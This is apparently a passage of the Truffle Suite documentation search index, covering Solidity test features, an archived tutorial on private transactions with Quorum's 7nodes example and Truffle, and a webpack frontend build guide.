hooks"},{"location":"docs/truffle/testing/writing-tests-in-solidity.html#advanced-features","text":"Solidity tests come with a few advanced features to let you test specific use cases within Solidity.","title":"Advanced features"},{"location":"docs/truffle/testing/writing-tests-in-solidity.html#testing-for-exceptions","text":"You can easily test if your contract should or shouldn't raise an exception (i.e., for require() / assert() / revert() statements; throw on previous versions of Solidity). This topic was first written about by guest writer Simon de la Rouviere in his tutorial Testing for Throws in Truffle Solidity Tests . N.B. that the tutorial makes heavy use of exceptions via the deprecated keyword throw , replaced by revert() , require() , and assert() starting in Solidity v0.4.13. Also, since Solidity v0.4.17, a function type member was added to enable you to access a function selector (e.g.: this.f.selector ), and so, testing for throws with external calls has been made much easier: pragma solidity ^ 0.5.0 ; import \"truffle/Assert.sol\" ; contract TestBytesLib2 { function testThrowFunctions () public { bool r ; // We're basically calling our contract externally with a raw call, forwarding all available gas, with // msg.data equal to the throwing function selector that we want to be sure throws and using only the boolean // value associated with the message call's success ( r , ) = address ( this ). call ( abi . encodePacked ( this . IThrow1 . selector )); Assert . isFalse ( r , \"If this is true, something is broken!\" ); ( r , ) = address ( this ). call ( abi . encodePacked ( this . IThrow2 . selector )); Assert . isFalse ( r , \"What?! 1 is equal to 10?\" ); } function IThrow1 () public pure { revert ( \"I will throw\" ); } function IThrow2 () public pure { require ( 1 == 10 , \"I will throw, too!\" ); } }","title":"Testing for exceptions"},{"location":"docs/truffle/testing/writing-tests-in-solidity.html#testing-ether-transactions","text":"You can also test how your contracts react to receiving Ether, and script that interaction within Solidity. To do so, your Solidity test should have a public function that returns a uint , called initialBalance . This can be written directly as a function or a public variable, as shown below. When your test contract is deployed to the network, Truffle will send that amount of Ether from your test account to your test contract. Your test contract can then use that Ether to script Ether interactions within your contract under test. Note that initialBalance is optional and not required. import \"truffle/Assert.sol\" ; import \"truffle/DeployedAddresses.sol\" ; import \"../contracts/MyContract.sol\" ; contract TestContract { // Truffle will send the TestContract one Ether after deploying the contract. uint public initialBalance = 1 ether ; function testInitialBalanceUsingDeployedContract () { MyContract myContract = MyContract ( DeployedAddresses . MyContract ()); // perform an action which sends value to myContract, then assert. myContract . send (...); } function () { // This will NOT be executed when Ether is sent. \\o/ } } Note that Truffle sends Ether to your test contract in a way that does not execute a fallback function, so you can still use the fallback function within your Solidity tests for advanced test cases.","title":"Testing ether transactions"},{"location":"events/index.html","text":"","title":"Truffle Suite"},{"location":"guides/index.html","text":"","title":"Truffle Suite"},{"location":"guides/building-dapps-for-quorum-private-enterprise-blockchains/index.html","text":"Archived: This tutorial has been archived and may not work as expected; versions are out of date, methods and workflows may have changed. We leave these up for historical context and for any universally useful information contained. Use at your own risk! Ethereum is perhaps best defined by its public network, a network where every transaction -- and all participants of each transaction -- are publicly available to anyone looking at its transaction history. Truffle got its start building for the public blockchain: at the time of Ethereum's launch, the public blockchain was the only smart contract blockchain around. However since launch, technology has changed, most notably with Quorum , the permissioned blockchain initially developed by JP Morgan Chase. Quorum is a version of Ethereum that adds new features on top of what Ethereum already provides. Specifically, Quorum adds the ability to create private blockchains between select participants, and more importantly adds transaction privacy on top of normal Ethereum transactions . Transaction privacy presents a number of useful use cases, especially in the enterprise and banking worlds. For instance, large banks might want to take advantage of blockchain technologies like Ethereum but don't want their transactions to be publicly available to everyone as a matter of doing business. Quorum presents a useful alternative. Let's use a quick example: Say Bob, Tom, and Alice all create a blockchain together, and Alice wants to send 20 TruffleCoin to Bob. But here's the kicker: she doesn't want Tom (or anyone else other than Bob) to know, because she cares about her privacy. Using Quorum, Alice could easily send a transaction where the transaction data is only available to her and Bob. This tutorial represents Truffle's official support for Quorum. By the end of this tutorial you'll learn how to use both Truffle and Quorum together to build privacy-enabled dapps. Requirements \u00b6 This tutorial expects you to have some knowledge of Truffle, Ethereum, Quorum, and Solidity. For more information on these topics, please see the following links: Truffle documentation Ethereum overview Quorum overview and documentation Solidity documentation You will primarily be using the command line for this tutorial. Please ensure you have basic familiarity with opening and using the command line provided by your operating system. Additionally, you will need the following software installed before proceeding: VirtualBox Vagrant Git Getting Started \u00b6 In this tutorial, we'll show you how to develop dapps for Quorum using Truffle and Quorum's 7nodes example . The steps are as follows: Setting up your Quorum client Connecting Truffle to Quorum Deploying smart contracts on Quorum Using Quorum's privacy features to make transactions private Interacting with contracts privately You'll see that developing for Quorum using Truffle is exactly like developing for the public Ethereum blockchain. Truffle supports Quorum out of the box, and the same strategies and methods for building Ethereum-enabled applications for the Ethereum public blockchain also apply to building dapps on Quorum. Setting up your Quorum client \u00b6 The Quorum client is a replacement for the Ethereum client. Using the Quorum client, you can set up a private blockchain that's only available to you and the people you allow to participate. We're going to use a Quorum cluster of seven nodes (so seven Quorum clients) already set up and configured for us inside a virtual machine. You could choose to install Quorum yourself by downloading it directly and building it from source, but for this example, using the pre-configured cluster is much easier. To set up the cluster, open a terminal and navigate to a directory where you'd like it installed. Here, we chose workspace : mkdir workspace cd workspace Download the Quorum examples repository: git clone https://github.com/jpmorganchase/quorum-examples We'll use Vagrant to initialize the cluster's virtual machine. Note that this step could take a few minutes as it makes the virtual machine ready for use. cd quorum-examples vagrant up After vagrant up successfully completes, we'll want a way to access our newly minted virtual machine. Note that a virtual machine is like another computer running inside of your own, and so we'll need a way to access it in order to run commands within the machine. Luckily vagrant provides just such a feature. Type the following command: vagrant ssh Note that after running this command, our command line changes to show a different prompt: ubuntu@ubuntu-xenial:~$ This designates that we're running commands inside the virtual machine. While we're at the above virtual machine prompt, navigate to the example we want to run: ubuntu@ubuntu-xenial:~$ cd quorum-examples/7nodes/ Our Quorum client is nearly ready to go. We need to run two more commands within the virtual machine. The first one creates seven Quorum nodes we can use to simulate a real Quorum deployment. The second one starts up those seven nodes. While the first command only needs to be run one, you should run the second command anytime you restart the virtual machine. ubuntu@ubuntu-xenial:~/quorum-examples/7nodes$ ./raft-init.sh ubuntu@ubuntu-xenial:~/quorum-examples/7nodes$ ./raft-start.sh Success! We now have seven Quorum nodes set up that we can use to represent seven different actors on our private network. Connecting Truffle to Quorum \u00b6 To set up Truffle, we're going to start by creating a bare Truffle project, without any contracts or code. We want to leave the old command line window alone and let the Quorum example run without bothering it, so open a second terminal. In the new terminal, navigate to your workspace and create a new directory for your Truffle project. cd workspace mkdir myproject Next, navigate to the new directory and initialize the bare Truffle project: cd myproject truffle init If you look at the contents of the myproject directory, you'll notice directories were created for you. See the Truffle documentation for more information about Truffle's project structure. Before moving onto code, we need to configure Truffle to point to our running Quorum client. For this example, we'll edit our development network configuration within truffle-config.js to point to the first node available in the 7nodes example: // File: `truffle-config.js` (edited for 7nodes example) module . exports = { networks : { development : { host : \"127.0.0.1\" , port : 22000 , // was 8545 network_id : \"*\" , // Match any network id gasPrice : 0 , gas : 4500000 , type : \"quorum\" // needed for Truffle to support Quorum } } }; Note that we changed the port that Truffle normally connects to (we changed it to 22000 ). Because of the magic of VirtualBox and Vagrant, the node running inside the virtual machine is made available to us via local ports, so connecting via 127.0.0.1 and 22000 will work just fine. **Note**: The seven Quorum clients respond on ports `22000` (node 1) through `22006` (node 7). Now that we have Truffle set up, we can move onto code. Deploying smart contracts on Quorum \u00b6 We won't spend too much time talking about writing or deploying contracts in Truffle since we have ample documentation , however we do want to show how deploying contracts applies to Quorum. First, copy the following contract into a new file, called SimpleStorage.sol . Place it in your contracts/ directory: // File: `./contracts/SimpleStorage.sol` pragma solidity ^ 0.4.17 ; contract SimpleStorage { uint public storedData ; constructor ( uint initVal ) public { storedData = initVal ; } function set ( uint x ) public { storedData = x ; } function get () view public returns ( uint retVal ) { return storedData ; } } Ensure the contract compiles using the command truffle compile within your project directory. truffle compile Next, create a new migration called 2_deploy_simplestorage.js within your migrations/ directory. Note that this migration is just like any other you'd create for Truffle, but there's one important difference. Let's see if you can catch it. // File: `./migrations/2_deploy_simplestorage.js` var SimpleStorage = artifacts . require ( \"SimpleStorage\" ); module . exports = function ( deployer ) { // Pass 42 to the contract as the first constructor parameter deployer . deploy ( SimpleStorage , 42 , { privateFor : [ \"ROAZBWtSacxXQrOe3FGAqJDyJjFePR5ce4TSIzmJ0Bc=\" ]}) }; If you guessed the difference was privateFor , you got it! privateFor is an extra transaction parameter added to Quorum that specifies that the transaction you're making -- in this case a contract deployment -- is private for a specific account, identified by the given public key . For this transaction, the public key we chose represents node 7. Since we previously configured Truffle to connect to node 1, this transaction will deploy a contract from node 1, making the transaction private between node 1 and node 7. Now it's time to deploy your contracts. Run the truffle migrate command and watch your contracts be successfully deployed: truffle migrate You will see output that looks like this. Your transaction IDs will be different though. Using network 'development' . Running migration: 1_initial_migration.js Deploying Migrations... Migrations: 0x721650d027d87cd247a3a776c4b6170bf1e5b936 Saving successful migration to network... Saving artifacts... Running migration: 2_deploy_simplestorage.js Deploying SimpleStorage... SimpleStorage: 0x10ae69385c79ef3eb815ac008a7013d6878f1d38 Saving successful migration to network... Saving artifacts... Now that the contract's deployed, it's off to the races. Using Quorum's privacy features to make transactions private \u00b6 We originally configured Truffle to point our development environment to the first of the seven nodes provided by the example. You can think of the first node as \"us\", as if we were developing a dapp for a private network that's used by multiple other parties. Since the 7nodes example provides us seven nodes to work with, we can tell Truffle about the other nodes so we can \"be\" someone else, and ensure the contract we deployed was private. To add a new network configuration, edit your truffle-config.js file again and add additional network configuration, choosing a network name that best describes the network connection you're adding. In this case, we're going to add a connection to node 4 ( nodefour ) and node 7 ( nodeseven ): // File: `truffle-config.js` module . exports = { networks : { development : { host : \"127.0.0.1\" , port : 22000 , // was 8545 network_id : \"*\" , // Match any network id gasPrice : 0 , gas : 4500000 , type : \"quorum\" // needed for Truffle to support Quorum }, nodefour : { host : \"127.0.0.1\" , port : 22003 , network_id : \"*\" , // Match any network id gasPrice : 0 , gas : 4500000 , type : \"quorum\" // needed for Truffle to support Quorum }, nodeseven : { host : \"127.0.0.1\" , port : 22006 , network_id : \"*\" , // Match any network id gasPrice : 0 , gas : 4500000 , type : \"quorum\" // needed for Truffle to support Quorum } } }; Like before, VirtualBox and Vagrant are making these nodes available to us through local ports, so these configurations can look the same as our development configuration except with a different ports specified. Now that our configuration is set up, we can use the Truffle console to interact with our deployed contract. First let's be \"us\" (node 1), configured via our development configuration. The easiest way to do this is to launch the Truffle console , which lets us interact with our deployed contracts directly. truffle console You will see a new prompt: truffle ( development ) > Here, we'll get the deployed instance of the SimpleStorage contract and then get the integer value we specified on deployment. Enter the following command: truffle ( development ) > SimpleStorage . deployed (). then ( function ( instance ) { return instance . get (); }) You'll see the following response: { [ String : '42' ] s : 1 , e : 1 , c : [ 42 ] } Note that Truffle's contract abstractions use Promises to interact with Ethereum. This can be a little cumbersome on the console as it requires a few extra key strokes to get things done, but within your application it makes control flow a lot smoother. Additionally, take a look at the output we received: We got 42 back, but as an object. This is because Ethereum can represent larger numbers than those natively represented by JavaScript, and so we need an abstraction in order to interact with them. Now let's try accessing the SimpleStorage contract as node four. To do this, quit out of the console (using Ctrl + C / Command + C ), and then launch the console again, but this time specifying the connection to node 4 instead of node 1: truffle console --network nodefour You'll see a new prompt: truffle ( nodefour ) > Run the same command as above to get the integer value from the SimpleStorage contract: truffle ( nodefour ) > SimpleStorage . deployed (). then ( function ( instance ) { return instance . get (); }) You'll see the following response: { [ String : '0' ] s : 1 , e : 0 , c : [ 0 ] } You'll notice we got 0 back instead. This is because the accounts represented by node 4 weren't privy to this contract. Lastly we can try with node 7, which was privy to this contract. Quit and relaunch the console again: truffle console --network nodeseven You'll see a new prompt: truffle ( nodeseven ) > Run the same command as above to get the integer value from the SimpleStorage contract: truffle ( nodeseven ) > SimpleStorage . deployed (). then ( function ( instance ) { return instance . get (); }) You'll see the following response: { [ String : '42' ] s : 1 , e : 1 , c : [ 42 ] } As you can see, we get 42 ! This shows that we can deploy contracts that are only available to our desired parties. Interacting with contracts privately \u00b6 So far, we've shown you how to deploy contracts that are private within your migrations. When building a dapp on Quorum, it'd also be helpful to learn how to make all transactions private. Truffle uses its @truffle/contract contract abstraction wherever contracts are used in JavaScript. When you interacted with SimpleStorage in the console above, for instance, you were using a @truffle/contract contract abstraction. These abstractions are also used within your migrations, your JavaScript-based unit tests, as well as executing external scripts with Truffle. Truffle's contract abstraction allow you to make a transaction against any function available on the contract. It does so by evaluating the functions of the contract and making them available to JavaScript. To see these transactions in action, we're going to use an advanced feature of Truffle that lets us execute external scripts within our Truffle environment. Creating a file called sampletx.js and save it in the root of your project (the same directory as your truffle-config.js file). Then fill it with this code: var SimpleStorage = artifacts . require ( \"SimpleStorage\" ); module . exports = function ( done ) { console . log ( \"Getting deployed version of SimpleStorage...\" ) SimpleStorage . deployed (). then ( function ( instance ) { console . log ( \"Setting value to 65...\" ); return instance . set ( 65 , { privateFor : [ \"ROAZBWtSacxXQrOe3FGAqJDyJjFePR5ce4TSIzmJ0Bc=\" ]}); }). then ( function ( result ) { console . log ( \"Transaction:\" , result . tx ); console . log ( \"Finished!\" ); done (); }). catch ( function ( e ) { console . log ( e ); done (); }); }; This code does two things: First, it asks Truffle to get our contract abstraction for the SimpleStorage contract. Then, it finds the deployed contract and sets the value managed by SimpleStorage to 65 , using the contract's set() function. As with the migration we wrote previously, the privateFor parameter can be appended within an object at the end of the transaction to tell Quorum that this transaction is private between the sender and the account represented by the given public key. Run this code using truffle exec : truffle exec sampletx.js Your output should look something like this (your transaction ID will be different though): Using network 'development' . Getting deployed version of SimpleStorage... Setting value to 65 ... Transaction: 0x0a7a661e657f5a706b0c39b4f197038ef0c3e77abc9970a623327c6f48ca9aff Finished! We can now use the Truffle console, like before, to check the results of this transaction. Let's see the value as node one: truffle console truffle ( development ) > SimpleStorage . deployed (). then ( function ( instance ) { return instance . get (); }) The response will be: { [ String : '65' ] s : 1 , e : 1 , c : [ 65 ] } We got 65 ! Now let's do node 4 (not privy to the transaction): truffle console --network nodefour truffle ( nodefour ) > SimpleStorage . deployed (). then ( function ( instance ) { return instance . get (); }) The response will be: { [ String : '0' ] s : 1 , e : 0 , c : [ 0 ] } We got zero, as expected. Now let's try node 7: truffle console --network nodeseven truffle ( nodeseven ) > SimpleStorage . deployed (). then ( function ( instance ) { return instance . get (); }) The response will be: { [ String : '65' ] s : 1 , e : 1 , c : [ 65 ] } And we got 65 again, as we should expect. This is how we can use Truffle's contract abstractions to make private transactions with Quorum. Is that all Truffle can do? \u00b6 Absolutely not! What we've shown you today is everything that makes building dapps for Quorum different than building dapps for the public Ethereum network. And what you'll see is it's not different at all: The only difference is adding the privateFor parameter for deployments and transactions you'd like to keep private. The rest is the same! In fact, now that you have the basics, you can explore all our other resources for building dapps with Truffle, including tutorials , writing advanced deployment scripts , unit testing ( with Solidity too ), and much more. By building with Truffle, you now have access to not only the best development tools and technologies (like Quorum), but you also have access to the largest Ethereum developer community around. Don't hesitate to drop us a line on Twitter or get help from fellow Trufflers in our community Gitter channel . There's always someone available to answer any questions you have. Cheers, and happy coding!","title":"Truffle Suite"},{"location":"guides/building-dapps-for-quorum-private-enterprise-blockchains/index.html#requirements","text":"This tutorial expects you to have some knowledge of Truffle, Ethereum, Quorum, and Solidity. For more information on these topics, please see the following links: Truffle documentation Ethereum overview Quorum overview and documentation Solidity documentation You will primarily be using the command line for this tutorial. Please ensure you have basic familiarity with opening and using the command line provided by your operating system. Additionally, you will need the following software installed before proceeding: VirtualBox Vagrant Git","title":"Requirements"},{"location":"guides/building-dapps-for-quorum-private-enterprise-blockchains/index.html#getting-started","text":"In this tutorial, we'll show you how to develop dapps for Quorum using Truffle and Quorum's 7nodes example . The steps are as follows: Setting up your Quorum client Connecting Truffle to Quorum Deploying smart contracts on Quorum Using Quorum's privacy features to make transactions private Interacting with contracts privately You'll see that developing for Quorum using Truffle is exactly like developing for the public Ethereum blockchain. Truffle supports Quorum out of the box, and the same strategies and methods for building Ethereum-enabled applications for the Ethereum public blockchain also apply to building dapps on Quorum.","title":"Getting Started"},{"location":"guides/building-dapps-for-quorum-private-enterprise-blockchains/index.html#setting-up-your-quorum-client","text":"The Quorum client is a replacement for the Ethereum client. Using the Quorum client, you can set up a private blockchain that's only available to you and the people you allow to participate. We're going to use a Quorum cluster of seven nodes (so seven Quorum clients) already set up and configured for us inside a virtual machine. You could choose to install Quorum yourself by downloading it directly and building it from source, but for this example, using the pre-configured cluster is much easier. To set up the cluster, open a terminal and navigate to a directory where you'd like it installed. Here, we chose workspace : mkdir workspace cd workspace Download the Quorum examples repository: git clone https://github.com/jpmorganchase/quorum-examples We'll use Vagrant to initialize the cluster's virtual machine. Note that this step could take a few minutes as it makes the virtual machine ready for use. cd quorum-examples vagrant up After vagrant up successfully completes, we'll want a way to access our newly minted virtual machine. Note that a virtual machine is like another computer running inside of your own, and so we'll need a way to access it in order to run commands within the machine. Luckily vagrant provides just such a feature. Type the following command: vagrant ssh Note that after running this command, our command line changes to show a different prompt: ubuntu@ubuntu-xenial:~$ This designates that we're running commands inside the virtual machine. While we're at the above virtual machine prompt, navigate to the example we want to run: ubuntu@ubuntu-xenial:~$ cd quorum-examples/7nodes/ Our Quorum client is nearly ready to go. We need to run two more commands within the virtual machine. The first one creates seven Quorum nodes we can use to simulate a real Quorum deployment. The second one starts up those seven nodes. While the first command only needs to be run one, you should run the second command anytime you restart the virtual machine. ubuntu@ubuntu-xenial:~/quorum-examples/7nodes$ ./raft-init.sh ubuntu@ubuntu-xenial:~/quorum-examples/7nodes$ ./raft-start.sh Success! We now have seven Quorum nodes set up that we can use to represent seven different actors on our private network.","title":"Setting up your Quorum client"},{"location":"guides/building-dapps-for-quorum-private-enterprise-blockchains/index.html#connecting-truffle-to-quorum","text":"To set up Truffle, we're going to start by creating a bare Truffle project, without any contracts or code. We want to leave the old command line window alone and let the Quorum example run without bothering it, so open a second terminal. In the new terminal, navigate to your workspace and create a new directory for your Truffle project. cd workspace mkdir myproject Next, navigate to the new directory and initialize the bare Truffle project: cd myproject truffle init If you look at the contents of the myproject directory, you'll notice directories were created for you. See the Truffle documentation for more information about Truffle's project structure. Before moving onto code, we need to configure Truffle to point to our running Quorum client. For this example, we'll edit our development network configuration within truffle-config.js to point to the first node available in the 7nodes example: // File: `truffle-config.js` (edited for 7nodes example) module . exports = { networks : { development : { host : \"127.0.0.1\" , port : 22000 , // was 8545 network_id : \"*\" , // Match any network id gasPrice : 0 , gas : 4500000 , type : \"quorum\" // needed for Truffle to support Quorum } } }; Note that we changed the port that Truffle normally connects to (we changed it to 22000 ). Because of the magic of VirtualBox and Vagrant, the node running inside the virtual machine is made available to us via local ports, so connecting via 127.0.0.1 and 22000 will work just fine. **Note**: The seven Quorum clients respond on ports `22000` (node 1) through `22006` (node 7). Now that we have Truffle set up, we can move onto code.","title":"Connecting Truffle to Quorum"},{"location":"guides/building-dapps-for-quorum-private-enterprise-blockchains/index.html#deploying-smart-contracts-on-quorum","text":"We won't spend too much time talking about writing or deploying contracts in Truffle since we have ample documentation , however we do want to show how deploying contracts applies to Quorum. First, copy the following contract into a new file, called SimpleStorage.sol . Place it in your contracts/ directory: // File: `./contracts/SimpleStorage.sol` pragma solidity ^ 0.4.17 ; contract SimpleStorage { uint public storedData ; constructor ( uint initVal ) public { storedData = initVal ; } function set ( uint x ) public { storedData = x ; } function get () view public returns ( uint retVal ) { return storedData ; } } Ensure the contract compiles using the command truffle compile within your project directory. truffle compile Next, create a new migration called 2_deploy_simplestorage.js within your migrations/ directory. Note that this migration is just like any other you'd create for Truffle, but there's one important difference. Let's see if you can catch it. // File: `./migrations/2_deploy_simplestorage.js` var SimpleStorage = artifacts . require ( \"SimpleStorage\" ); module . exports = function ( deployer ) { // Pass 42 to the contract as the first constructor parameter deployer . deploy ( SimpleStorage , 42 , { privateFor : [ \"ROAZBWtSacxXQrOe3FGAqJDyJjFePR5ce4TSIzmJ0Bc=\" ]}) }; If you guessed the difference was privateFor , you got it! privateFor is an extra transaction parameter added to Quorum that specifies that the transaction you're making -- in this case a contract deployment -- is private for a specific account, identified by the given public key . For this transaction, the public key we chose represents node 7. Since we previously configured Truffle to connect to node 1, this transaction will deploy a contract from node 1, making the transaction private between node 1 and node 7. Now it's time to deploy your contracts. Run the truffle migrate command and watch your contracts be successfully deployed: truffle migrate You will see output that looks like this. Your transaction IDs will be different though. Using network 'development' . Running migration: 1_initial_migration.js Deploying Migrations... Migrations: 0x721650d027d87cd247a3a776c4b6170bf1e5b936 Saving successful migration to network... Saving artifacts... Running migration: 2_deploy_simplestorage.js Deploying SimpleStorage... SimpleStorage: 0x10ae69385c79ef3eb815ac008a7013d6878f1d38 Saving successful migration to network... Saving artifacts... Now that the contract's deployed, it's off to the races.","title":"Deploying smart contracts on Quorum"},{"location":"guides/building-dapps-for-quorum-private-enterprise-blockchains/index.html#using-quorums-privacy-features-to-make-transactions-private","text":"We originally configured Truffle to point our development environment to the first of the seven nodes provided by the example. You can think of the first node as \"us\", as if we were developing a dapp for a private network that's used by multiple other parties. Since the 7nodes example provides us seven nodes to work with, we can tell Truffle about the other nodes so we can \"be\" someone else, and ensure the contract we deployed was private. To add a new network configuration, edit your truffle-config.js file again and add additional network configuration, choosing a network name that best describes the network connection you're adding. In this case, we're going to add a connection to node 4 ( nodefour ) and node 7 ( nodeseven ): // File: `truffle-config.js` module . exports = { networks : { development : { host : \"127.0.0.1\" , port : 22000 , // was 8545 network_id : \"*\" , // Match any network id gasPrice : 0 , gas : 4500000 , type : \"quorum\" // needed for Truffle to support Quorum }, nodefour : { host : \"127.0.0.1\" , port : 22003 , network_id : \"*\" , // Match any network id gasPrice : 0 , gas : 4500000 , type : \"quorum\" // needed for Truffle to support Quorum }, nodeseven : { host : \"127.0.0.1\" , port : 22006 , network_id : \"*\" , // Match any network id gasPrice : 0 , gas : 4500000 , type : \"quorum\" // needed for Truffle to support Quorum } } }; Like before, VirtualBox and Vagrant are making these nodes available to us through local ports, so these configurations can look the same as our development configuration except with a different ports specified. Now that our configuration is set up, we can use the Truffle console to interact with our deployed contract. First let's be \"us\" (node 1), configured via our development configuration. The easiest way to do this is to launch the Truffle console , which lets us interact with our deployed contracts directly. truffle console You will see a new prompt: truffle ( development ) > Here, we'll get the deployed instance of the SimpleStorage contract and then get the integer value we specified on deployment. Enter the following command: truffle ( development ) > SimpleStorage . deployed (). then ( function ( instance ) { return instance . get (); }) You'll see the following response: { [ String : '42' ] s : 1 , e : 1 , c : [ 42 ] } Note that Truffle's contract abstractions use Promises to interact with Ethereum. This can be a little cumbersome on the console as it requires a few extra key strokes to get things done, but within your application it makes control flow a lot smoother. Additionally, take a look at the output we received: We got 42 back, but as an object. This is because Ethereum can represent larger numbers than those natively represented by JavaScript, and so we need an abstraction in order to interact with them. Now let's try accessing the SimpleStorage contract as node four. To do this, quit out of the console (using Ctrl + C / Command + C ), and then launch the console again, but this time specifying the connection to node 4 instead of node 1: truffle console --network nodefour You'll see a new prompt: truffle ( nodefour ) > Run the same command as above to get the integer value from the SimpleStorage contract: truffle ( nodefour ) > SimpleStorage . deployed (). then ( function ( instance ) { return instance . get (); }) You'll see the following response: { [ String : '0' ] s : 1 , e : 0 , c : [ 0 ] } You'll notice we got 0 back instead. This is because the accounts represented by node 4 weren't privy to this contract. Lastly we can try with node 7, which was privy to this contract. Quit and relaunch the console again: truffle console --network nodeseven You'll see a new prompt: truffle ( nodeseven ) > Run the same command as above to get the integer value from the SimpleStorage contract: truffle ( nodeseven ) > SimpleStorage . deployed (). then ( function ( instance ) { return instance . get (); }) You'll see the following response: { [ String : '42' ] s : 1 , e : 1 , c : [ 42 ] } As you can see, we get 42 ! This shows that we can deploy contracts that are only available to our desired parties.","title":"Using Quorum's privacy features to make transactions private"},{"location":"guides/building-dapps-for-quorum-private-enterprise-blockchains/index.html#interacting-with-contracts-privately","text":"So far, we've shown you how to deploy contracts that are private within your migrations. When building a dapp on Quorum, it'd also be helpful to learn how to make all transactions private. Truffle uses its @truffle/contract contract abstraction wherever contracts are used in JavaScript. When you interacted with SimpleStorage in the console above, for instance, you were using a @truffle/contract contract abstraction. These abstractions are also used within your migrations, your JavaScript-based unit tests, as well as executing external scripts with Truffle. Truffle's contract abstraction allow you to make a transaction against any function available on the contract. It does so by evaluating the functions of the contract and making them available to JavaScript. To see these transactions in action, we're going to use an advanced feature of Truffle that lets us execute external scripts within our Truffle environment. Creating a file called sampletx.js and save it in the root of your project (the same directory as your truffle-config.js file). Then fill it with this code: var SimpleStorage = artifacts . require ( \"SimpleStorage\" ); module . exports = function ( done ) { console . log ( \"Getting deployed version of SimpleStorage...\" ) SimpleStorage . deployed (). then ( function ( instance ) { console . log ( \"Setting value to 65...\" ); return instance . set ( 65 , { privateFor : [ \"ROAZBWtSacxXQrOe3FGAqJDyJjFePR5ce4TSIzmJ0Bc=\" ]}); }). then ( function ( result ) { console . log ( \"Transaction:\" , result . tx ); console . log ( \"Finished!\" ); done (); }). catch ( function ( e ) { console . log ( e ); done (); }); }; This code does two things: First, it asks Truffle to get our contract abstraction for the SimpleStorage contract. Then, it finds the deployed contract and sets the value managed by SimpleStorage to 65 , using the contract's set() function. As with the migration we wrote previously, the privateFor parameter can be appended within an object at the end of the transaction to tell Quorum that this transaction is private between the sender and the account represented by the given public key. Run this code using truffle exec : truffle exec sampletx.js Your output should look something like this (your transaction ID will be different though): Using network 'development' . Getting deployed version of SimpleStorage... Setting value to 65 ... Transaction: 0x0a7a661e657f5a706b0c39b4f197038ef0c3e77abc9970a623327c6f48ca9aff Finished! We can now use the Truffle console, like before, to check the results of this transaction. Let's see the value as node one: truffle console truffle ( development ) > SimpleStorage . deployed (). then ( function ( instance ) { return instance . get (); }) The response will be: { [ String : '65' ] s : 1 , e : 1 , c : [ 65 ] } We got 65 ! Now let's do node 4 (not privy to the transaction): truffle console --network nodefour truffle ( nodefour ) > SimpleStorage . deployed (). then ( function ( instance ) { return instance . get (); }) The response will be: { [ String : '0' ] s : 1 , e : 0 , c : [ 0 ] } We got zero, as expected. Now let's try node 7: truffle console --network nodeseven truffle ( nodeseven ) > SimpleStorage . deployed (). then ( function ( instance ) { return instance . get (); }) The response will be: { [ String : '65' ] s : 1 , e : 1 , c : [ 65 ] } And we got 65 again, as we should expect. This is how we can use Truffle's contract abstractions to make private transactions with Quorum.","title":"Interacting with contracts privately"},{"location":"guides/building-dapps-for-quorum-private-enterprise-blockchains/index.html#is-that-all-truffle-can-do","text":"Absolutely not! What we've shown you today is everything that makes building dapps for Quorum different than building dapps for the public Ethereum network. And what you'll see is it's not different at all: The only difference is adding the privateFor parameter for deployments and transactions you'd like to keep private. The rest is the same! In fact, now that you have the basics, you can explore all our other resources for building dapps with Truffle, including tutorials , writing advanced deployment scripts , unit testing ( with Solidity too ), and much more. By building with Truffle, you now have access to not only the best development tools and technologies (like Quorum), but you also have access to the largest Ethereum developer community around. Don't hesitate to drop us a line on Twitter or get help from fellow Trufflers in our community Gitter channel . There's always someone available to answer any questions you have. Cheers, and happy coding!","title":"Is that all Truffle can do?"},{"location":"guides/building-testing-frontend-app-truffle-3/index.html","text":"**Update**: While this tutorial was originally written for Truffle 3, we have updated it to be fully compatible with newer versions of Truffle. We have kept some of the language unaltered, except where necessary. Truffle 3 is out and switched to less opinionated build process that allows any build pipeline to be plugged in. We're going to take advantage of that feature today, and build a frontend app with a custom pipeline. Intended audience \u00b6 This is written for those familiar with Truffle and Ethereum, who want a sense of how to structure a frontend application for easy development and testing. This example uses webpack , but familiarity with other build tools is enough background. What does a build process need to do in Truffle? \u00b6 In general, simple: Turn all higher level code (like ES6, SASS, JSX, templates, etc.) into vanilla JavaScript/HTML/CSS artifacts, and then move those artifacts into the build/ folder alongside our contract artifacts. What this tutorial does \u00b6 Uses webpack to compile the application's frontend code and move the artifacts into the build/ folder. Getting started \u00b6 Once you have Truffle installed, run truffle unbox webpack in an empty directory to pull down the Truffle Box for this tutorial. If you're familiar with the MetaCoin Truffle Box ), you'll notice your old friends Metacoin.sol and ConvertLib.sol are there. But now, running truffle build does this: Error building: No build configuration specified. Can ' t build. Build failed. See above. That's ok! Truffle is getting out of your way and letting you control the build process. Our new process is specified in webpack.config.js . More on this later. Compile, migrate, and ... \u00b6 In order to interact with contracts, we need them deployed on a network! The default network is configured in truffle.js : networks : { development : { host : '127.0.0.1' , port : 7545 , network_id : '*' // Match any network id } } This is the default setting for Ganache , though you can change this to use any connection you'd like. **Note**: Read more about [setting up Ganache](/docs/ganache/using). You can also use [Truffle Develop](/docs/getting_started/console), which launches a personal blockchain for testing and is built directly into Truffle, no separate installation required. Let's get the contracts on the network: First run truffle compile . This will compile the .sol contracts into .json artifacts (specified in the @truffle/contract library). They will appear in build/contracts/*.json . Now we can include contracts in our app with a simple import or require statement: // Import our contract artifacts and turn them into usable abstractions. import metacoin_artifacts from '../../build/contracts/MetaCoin.json' Next, make sure you have a blockchain running, and then run truffle migrate . This will deploy the contracts onto the default network running at 127.0.0.1:7545 . ... (webpack) build \u00b6 All that's left is to use webpack to compile the app and place it in the build/ folder. A simple npm run dev and we're done! This will build the app and serve it on http://127.0.0.1:8080 . Relevant configs here: // file: package.json ... \"scripts\" : { \"lint\" : \"eslint ./\" , \"build\" : \"webpack\" , \"dev\" : \"webpack-dev-server\" }, ... // file: webpack.config.js ... entry : './app/javascripts/app.js' , output : { path : path . resolve ( __dirname , 'build' ), filename : 'app.js' }, plugins : [ // Copy our app's index.html to the build folder. new CopyWebpackPlugin ([ { from : './app/index.html' , to : 'index.html' } ]) ], ... You can find more information on webpack concepts on webpack's website . Notice we didn't have to use webpack here, but Truffle comes with a handy webpack demo that gets us started quickly. We could replace the webpack config with a Gruntfile , for instance, and use Grunt instead. Truffle don't care no mo'. The app \u00b6 As previously mentioned, the command npm run dev builds the app and serves it with a local web server. (This is equivalent to running npm run build and then truffle serve , but we've done it in one step for convenience.) To see it, navigate to http://127.0.0.1:8080 . You should see: That's it, all done! 